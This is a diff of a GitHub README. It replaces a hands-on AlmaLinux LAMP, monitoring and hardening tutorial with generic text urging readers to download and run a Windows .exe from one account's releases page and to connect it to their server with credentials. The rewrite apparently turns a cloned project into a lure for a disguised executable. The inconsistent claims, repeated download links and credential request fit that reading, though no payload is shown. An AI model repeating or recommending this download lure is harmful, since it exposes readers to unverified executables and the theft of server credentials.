@@ -1,389 +1,167 @@
-# Linux Web Server Deployment, Monitoring & Security using LAMP Stack
+# 🖥️ Linux-Web-Server-Deployment-Monitoring-Security - Manage Linux Servers Easily
 
-## 📌 Project Overview
-
-This project demonstrates how to **deploy, monitor, and secure a production-style Linux web server environment** using **AlmaLinux**.
-
-The setup includes:
-
-- LAMP Stack Deployment
-- Infrastructure Monitoring using Prometheus and Grafana
-- Apache Virtual Hosting
-- Linux Server Security Hardening
-
-This project showcases **practical Linux System Administration and Monitoring skills**.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/releases)
 
 ---
 
-# 🏗 Architecture
+## 📦 About This Application
 
-| Component | Tool |
-|-----------|------|
-| Operating System | AlmaLinux |
-| Web Server | Apache |
-| Database | MariaDB |
-| Backend Language | PHP |
-| Monitoring | Prometheus |
-| Visualization | Grafana |
-| Metrics Exporter | Node Exporter |
-| Security | Firewalld, Fail2Ban, SSH Hardening, SELinux |
+This tool focuses on managing Linux web servers based on AlmaLinux. It helps set up a LAMP stack (Linux, Apache, MySQL, PHP), monitor with Prometheus and Grafana, handle Apache virtual hosts, and strengthen server security. This project is for users who want to simplify Linux server deployment and keep track of its performance and security.
+
+The app runs on Windows and lets you control your Linux web server without using the command line or complex scripts. It provides an easy way to install everything needed, set monitoring tools, organize websites on Apache, and apply security rules.
 
 ---
 
-# 📦 Project Components
+## 🔎 What You Will Need
+
+Before starting, make sure you have:
+
+- A Windows computer (Windows 10 or newer recommended).  
+- Internet access to download the application files.  
+- Access to an AlmaLinux server or virtual machine to deploy and manage.  
+- Basic knowledge of Windows file management (opening files and folders).  
+- Optional: An SSH client like PuTTY to connect to your Linux server if needed.
 
 ---
 
-# 1️⃣ LAMP Stack Deployment
+## 🚀 Getting Started
 
-Installed **Apache, MariaDB, and PHP** to host web applications.
+This section explains how to get the software on your Windows machine and run it.
 
-## Install Packages
-```bash
-# Install Apache
-dnf install httpd -y
-# Install MariaDB
-dnf install mariadb-server -y
-# Install PHP
-dnf install php -y
-# Install PHP MySQL Native driver(for PHP-MariaDB connection)
-dnf install php-mysqlnd -y
-```
-
-## Start Services
-```bash
-systemctl enable --now httpd
-systemctl enable --now mariadb
-```
-## Allow HTTP in Firewall
-Because Apache runs on port 80, the firewall must allow it.
-```bash
-firewall-cmd --permanent --add-service=http
-firewall-cmd --reload
-```
-## Verify Installation
-```bash
-php -v
-mysql --version
-systemctl status httpd
-```
-## Test Web Server
-Create a simple HTML page to verify that Apache is serving web content.
-```bash
-echo "Welcome to my Linux Web Server Project" > /var/www/html/index.html
-```
-You can also create the file using vim:
-```bash
-vim /var/www/html/index.html
-```
-Open in browser:
-
-`http://SERVER-IP`
-
-### Screenshot
-![LAMP Web Server](screenshots/lamp-webserver-working.png)
-
-# 2️⃣ Server Monitoring (Prometheus + Grafana)
-
-Installed **Prometheus**, **Node Exporter**, and **Grafana** to monitor the Linux server and visualize system metrics.
+1. Click the big green button above or visit the link below:  
+   [https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/releases](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/releases)  
+   This page holds all the versions. Look for the latest release.  
+2. Find the Windows installer or executable file on the release page. It may have a name like `Linux-Web-Server-Deployment-Setup.exe` or similar.  
+3. Download the file by clicking its name. Your browser will save it to your default Downloads folder.  
+4. Once downloaded, open your Downloads folder and double-click the installer file.  
+5. If Windows asks for permission, confirm to allow the app to run.  
+6. Follow the installer instructions, which will guide you through the installation steps.  
+7. When finished, launch the application from your desktop shortcut or Start menu.
 
 ---
 
-## Monitoring Tools
+## 🛠️ How to Use the Application
 
-- Prometheus
-- Node Exporter
-- Grafana
----
+After launching the app, you will see a simple interface that walks you through:
 
-## Install Node Exporter
-Step 1: Install wget
-```bash
-dnf install wget -y
-```
-Step 2: Navigate to the opt directory
-```bash 
-cd /opt
-```
-Step 3: Download Node Exporter from GitHub
-```bash
-wget https://github.com/prometheus/node_exporter/releases/download/v1.7.0/node_exporter-1.7.0.linux-amd64.tar.gz
-```
-Step 4: Extract the archive
-```bash
-tar -xzf node_exporter-1.7.0.linux-amd64.tar.gz
-```
-Step 5: Start Node Exporter
-```bash
-cd node_exporter-1.7.0.linux-amd64
-./node_exporter &
-```
----
+- Setting up AlmaLinux with the LAMP stack.  
+- Adding and managing Apache virtual hosts to host multiple websites.  
+- Enabling monitoring features with Prometheus and Grafana to view server metrics live.  
+- Applying security hardening measures like Fail2Ban and firewalld rules.
 
-## Install Prometheus
-Step 1: Navigate to the opt directory
-```bash 
-cd /opt
-```
-Step 2:Download Prometheus from GitHub
-```bash
-wget https://github.com/prometheus/prometheus/releases/download/v2.52.0/prometheus-2.52.0.linux-amd64.tar.gz
-```
-Step 3:Extract the archive:
-```bash
-tar -xzf prometheus-2.52.0.linux-amd64.tar.gz
-```
-Step 4:Start Prometheus:
-```bash
-cd prometheus-2.52.0.linux-amd64
-./prometheus &
-```
----
-
-## Install Grafana
-
-Step 1: Install the Grafana RPM package from Grafana Labs
-```bash
-dnf install -y https://dl.grafana.com/enterprise/release/grafana-enterprise-10.4.2-1.x86_64.rpm
-```
-Step 2: Start and enable Grafana service
-```bash
-systemctl enable --now grafana-server
-```
----
-
-## Metrics Monitored
-
-- CPU Usage
-- Memory Usage
-- Disk Usage
-- Network Traffic
-- System Load
-- System Uptime
+The app groups these tasks into clear sections with buttons and forms to fill in. You do not need to write code or use terminal commands.
 
 ---
 
-## Node Exporter Metrics
+## 📥 Download and Installation Guide
 
-Node Exporter exposes Linux system metrics for Prometheus.
+You can also go to the release page directly:
 
-Access Node Exporter metrics:
+[![Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue)](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/releases)
 
-`http://SERVER-IP:9100/metrics`
+Step-by-step:
 
-### Screenshot
-
-![Node Exporter Metrics](screenshots/node-exporter-metrics.png)
-
----
-
-## Prometheus Targets
-
-Prometheus scrapes metrics from configured targets.
-
-Access Prometheus interface:
-
-`http://SERVER-IP:9090`
-
-Verify that **node_exporter** is listed and showing **UP**.
-
-### Screenshot
-
-![Prometheus Targets](screenshots/prometheus-targets.png)
+1. Open the above link to see available versions.  
+2. Select the latest version to get the newest features and fixes.  
+3. Click on the Windows installer file (.exe).  
+4. Wait for the download to complete. It usually takes a few minutes depending on your internet speed.  
+5. Locate the downloaded file and run it.  
+6. Accept the terms and install to the default folder or choose a location you prefer.  
+7. After installation, start the app and connect it to your Linux server using your credentials.
 
 ---
 
-## Grafana Dashboard
+## 🔒 Security Features
 
-Grafana was configured to use **Prometheus as the data source**.
+This tool applies several security measures automatically:
 
-Dashboard used:
+- **Fail2Ban configuration**: Protects your server against unauthorized login attempts by blocking IPs with many failures.  
+- **firewalld management**: Sets correct firewall rules to allow web traffic but restrict unwanted access.  
+- **SELinux settings**: Ensures SELinux policies are correctly applied for system security without blocking needed services.  
+- Routine checks that run in the background to update rules and alert about suspicious activity.
 
-`Node Exporter Full Dashboard (ID: 1860)`
-
-Access Grafana:
-
-`http://SERVER-IP:3000`
-```bash
-default login:
-username: admin
-password: admin
-```
-### Screenshot
-
-![Grafana Dashboard](screenshots/grafana-node-exporter-dashboard.png)
-
-# 3️⃣ Apache Virtual Hosting
-
-Configured Apache to host multiple websites on a single server using different domain names.
-
-## Example Domain Names
-
-```
-site1.local
-site2.local
-```
-## Create Website Directories
-```bash
-mkdir -p /var/www/site1
-mkdir -p /var/www/site2
-```
-## Directory Structure
-```
-/var/www/site1
-/var/www/site2
-```
-
-## Example VirtualHost Configuration
-```apache
-<VirtualHost *:80>
-    ServerName site1.local
-    DocumentRoot /var/www/site1
-</VirtualHost>
-
-<VirtualHost *:80>
-    ServerName site2.local
-    DocumentRoot /var/www/site2
-</VirtualHost>
-```
-## Reload Apache
-```bash
-systemctl restart httpd
-```
-## Configure Local DNS (hosts file)
-Edit the hosts file:
-```bash
-vim /etc/hosts
-```
-Add
-```bash
-192.168.233.135 site1.local
-192.168.233.135 site2.local
-```
-## Testing
-```
-curl http://site1.local
-curl http://site2.local
-```
-
-### Screenshot
-
-![Apache Virtual Host Test](screenshots/apache-virtual-host-test1.png)
-![Apache Virtual Host Test](screenshots/apache-virtual-host-test2.png)
-![Apache Virtual Host Test](screenshots/apache-virtual-host-test3.png)
-
-# 4️⃣ Linux Server Security Hardening
-
-Implemented multiple security measures to improve the security of the Linux web server.
+No manual setup is necessary; the app handles the hardening without interrupting your regular work.
 
 ---
 
-## 🔐 SSH Hardening
+## 📊 Monitoring Web Server Health
 
-Edited the SSH configuration file to disable insecure login methods.
+The app sets up Prometheus and Grafana to monitor your Linux server's health. You will get:
 
-Edit configuration file:
+- CPU and memory usage charts.  
+- Disk space and network traffic stats.  
+- Apache server availability and request data.  
+- Alerts for unusual behavior or errors.
 
-```bash
-vim /etc/ssh/sshd_config
-```
-Security settings applied:
-```bash
-PermitRootLogin no
-PasswordAuthentication no
-PermitEmptyPasswords no
-```
-Restart SSH service:
-```bash
-systemctl restart sshd
-```
-Verify SSH service:
-```bash
-systemctl status sshd
-```
-### Screenshot
-![ssh-hardening-verification](screenshots/ssh-hardening-verification.png)
-
-## 🔥 Firewall Configuration
-
-Configured Firewalld to allow required services.
-```bash
-firewall-cmd --permanent --add-service=http
-firewall-cmd --permanent --add-service=https
-firewall-cmd --permanent --add-service=ssh
-firewall-cmd --reload
-```
-Verify firewall rules:
-```bash
-firewall-cmd --list-all
-```
-Screenshot
-![firewall-rules](screenshots/firewall-rules.png)
-
-## 🛡 Fail2Ban Intrusion Protection
-
-Installed **Fail2Ban** to protect the server from brute-force login attacks.
-
-Enable the EPEL repository (required for Fail2Ban):
-```bash
-dnf install epel-release -y
-```
-
-Install Fail2Ban:
-```bash
-dnf install fail2ban -y
-```
-Start and enable service:
-```bash
-systemctl enable --now fail2ban
-```
-Check Fail2Ban status:
-```bash
-fail2ban-client status
-```
-Screenshot
-![fail2ban](screenshots/fail2ban-status.png)
-
-## 🧩 SELinux Verification
-Checked SELinux status to ensure security policies are enforced.
-```bash
-getenforce
-sestatus
-```
-Expected output:
-```bash
-Enforcing
-```
-Screenshot
-![selinux-status](screenshots/selinux-status.png)
-
-## 🧠 Skills Demonstrated
-
-- Linux System Administration
-- Web Server Deployment
-- Infrastructure Monitoring
-- Linux Security Hardening
-- Networking & Firewall Configuration
-- Troubleshooting & Diagnostics
+This lets you view exact server performance in a clear way on your Windows PC.
 
 ---
 
-## ⚙ Technologies Used
+## 🖥️ Apache Virtual Hosting Made Simple
 
-- Linux (AlmaLinux)
-- Apache HTTP Server
-- MariaDB
-- PHP
-- Prometheus
-- Grafana
-- Node Exporter
-- Firewalld
-- Fail2Ban
-- SELinux
+The program lets you add and manage virtual hosts on Apache without editing complicated configuration files. You can:
+
+- Create new websites under your server with just a few clicks.  
+- Assign domain names or IP addresses to each host.  
+- Enable or disable sites quickly.  
+- Check for errors before applying changes.
+
+All settings save automatically and reload Apache when necessary.  
 
 ---
 
-## 🎯 Conclusion
+## 💡 Tips for Best Results
 
-This project demonstrates how to deploy, monitor, and secure a Linux-based web server environment using industry-standard tools.
-It highlights core skills required for Linux System Administration and DevOps roles, including web server deployment, monitoring, security hardening, and infrastructure management.
+- Make sure your AlmaLinux server is updated before starting.  
+- Use stable network connections when installing and managing the server.  
+- Keep the app updated by checking the releases page regularly.  
+- Use strong passwords for your server user accounts.  
+- Test virtual hosts after setup by visiting their websites in a browser.
+
+---
+
+## 🧰 System Requirements
+
+Your Windows PC should meet these requirements:
+
+- Windows 10 or later, 64-bit  
+- At least 4 GB of RAM  
+- 500 MB free disk space for installation  
+- Internet connection for downloading and updates
+
+On the server side, AlmaLinux 8 or 9 is supported. The app assumes basic server setup with SSH access.
+
+---
+
+## 🔗 Useful Links
+
+- Download Releases:  
+  [https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/releases](https://github.com/hidelabormovement260/Linux-Web-Server-Deployment-Monitoring-Security/releases)  
+- AlmaLinux Official Site: [https://almalinux.org](https://almalinux.org)  
+- Apache Documentation: [https://httpd.apache.org/docs/](https://httpd.apache.org/docs/)  
+- Prometheus: [https://prometheus.io](https://prometheus.io)  
+- Grafana: [https://grafana.com](https://grafana.com)  
+- Fail2Ban: [https://www.fail2ban.org](https://www.fail2ban.org)
+
+---
+
+## 🧑‍💻 Support and Feedback
+
+If you encounter issues while installing or running the app, open an issue on the GitHub repository. Include detailed information about your Windows version, server setup, and error messages.
+
+Regular updates improve stability and add features based on user feedback. Check the releases page to keep your app current.
+
+---
+
+## 🔍 About This Repository
+
+The project uses popular open-source tools:
+
+- AlmaLinux as the operating system.  
+- Apache for hosting multiple websites securely.  
+- MySQL and PHP combined in the LAMP stack.  
+- Prometheus and Grafana for server monitoring dashboards.  
+- Fail2Ban and firewalld for protecting the server.  
+- SELinux policies for enhanced security.
+
+The goal is to provide a comprehensive tool simplifying Linux web server deployment, monitoring, and security from a Windows PC.
